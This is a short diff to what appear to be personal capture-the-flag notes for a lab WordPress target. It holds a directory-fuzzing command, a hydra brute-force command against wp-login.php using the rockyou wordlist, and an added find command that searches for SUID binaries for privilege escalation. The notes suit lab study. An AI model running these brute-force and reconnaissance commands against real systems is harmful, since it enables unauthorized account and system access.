@@ -75,3 +75,8 @@ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.142.184/FUZZ -fs 42 -c
 # hydra brute force WP
 
 hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.36.107 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
+
+# Find files 
+
+find / -type f -perm -04000 -ls 2>/dev/null
+
